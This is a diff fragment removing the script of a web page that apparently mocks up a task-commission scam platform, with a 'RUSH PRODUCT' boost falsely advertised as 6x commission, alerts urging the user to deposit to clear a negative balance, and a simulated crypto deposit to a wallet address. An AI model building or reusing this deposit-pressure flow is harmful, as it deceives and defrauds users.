-                alert(`✅ Set ${state.currentSet - 1} complete! Starting set ${state.currentSet}`);
-            }
-
-            state.currentProduct = generateProduct();
-            updateUI();
-            updateProductCard();
-        }
-
-        function boostProduct() {
-            const p = randomItem(rushProducts);
-            state.currentProduct = { 
-                ...p, 
-                commission: 3,
-                isRush: true,
-                name: '⚡ RUSH PRODUCT',
-                icon: '⚡',
-                desc: 'URGENT - HIGH PRIORITY TASK - 6x COMMISSION'
-            };
-            state.isRushActive = true;
-            state.rushProductValue = p.value;
-            
-            const comm = p.value * 0.03;
-            const newBal = state.balance + comm;
-            
-            if (newBal < 0) {
-                state.balance = newBal;
-                state.negativeBalance = true;
-                state.rushDepositNeeded = Math.abs(newBal);
-                updateUI();
-                updateProductCard();
-                alert(`⚡ RUSH PRODUCT DETECTED!\n\nProduct Value: $${fmt(p.value)}\nCurrent Balance: $${fmt(newBal)}\nAmount to Deposit: $${fmt(Math.abs(newBal))}\n\nPlease deposit to continue and earn 6x commission!`);
-                openInsufficientModal();
-            } else {
-                state.balance = newBal;
-                updateUI();
-                updateProductCard();
-                alert(`⚡ Boost activated! Rush Product loaded.\n\nValue: $${fmt(p.value)}\nCommission: 3%\nProfit: $${fmt(comm)}`);
-            }
-        }
-
-        // ===== SIMULATE DEPOSIT =====
-        function simulateCryptoDeposit() {
-            if (!state.walletAddress) {
-                alert('⚠️ Please set your wallet address first!');
-                return;
-            }
-
-            const needed = state.balance < 0 ? Math.abs(state.balance) : 0;
-            if (needed > 0) {
-                state.balance += needed;
-                state.deposit += needed;
-                state.negativeBalance = false;
-                state.isRushActive = false;
-                state.rushDepositNeeded = 0;
-                closeInsufficientModal();
-                alert(`💳 Deposited $${fmt(needed)} via Crypto\n📤 Sent to: ${state.walletAddress}`);
-                updateUI();
-                updateProductCard();
-            } else {
-                const amt = prompt('Enter deposit amount (USD):', '100');
-                if (amt && !isNaN(amt) && parseFloat(amt) > 0) {
-                    const val = parseFloat(amt);
-                    state.balance += val;
-                    state.deposit += val;
-                    alert(`💳 Deposited $${fmt(val)} via Crypto\n📤 Sent to: ${state.walletAddress}`);
-                    updateUI();
-                    updateProductCard();
-                }
-            }
-        }
-
-        // ===== HISTORY =====
-        function showHistory() {
-            const panel = $('historyPanel');
-            panel.classList.toggle('hidden');
-            const list = $('historyList');
-            list.innerHTML = '';
-            if (state.history.length === 0) {
-                list.innerHTML = '<p class="small-text">No history yet.</p>';
-            } else {
-                state.history.slice().reverse().forEach(h => {
-                    const div = document.createElement('div');
-                    div.className = 'history-item';
-                    div.innerHTML = `
-                        <span>${h.type} - $${fmt(h.value)}</span>
-                        <span class="${h.commission > 0 ? 'profit-green' : 'profit-red'}">+$${fmt(h.commission)}</span>
-                    `;
-                    list.appendChild(div);
-                });
-            }
-        }
-
-        function closeHistory() {
-            $('historyPanel').classList.add('hidden');
-        }
-
-        function logout() {
-            state.loggedIn = false;
-            $('dashboardScreen').classList.add('hidden');
-            $('loginScreen').classList.remove('hidden');
-            $('registerScreen').classList.add('hidden');
-        }
-
-        // ===== INIT =====
-        state.currentProduct = generateProduct();
-        updateUI();
-        updateProductCard();
-
-        document.addEventListener('click', function(e) {
-            if (e.target === $('depositModal')) closeDepositModal();
-            if (e.target === $('insufficientModal')) closeInsufficientModal();
-            if (e.target === $('completeModal')) closeCompleteModal();
-        });
-    </script>
-
-</body>
-</html>
+                if (!confirm('⚠️ You haven\'t set a
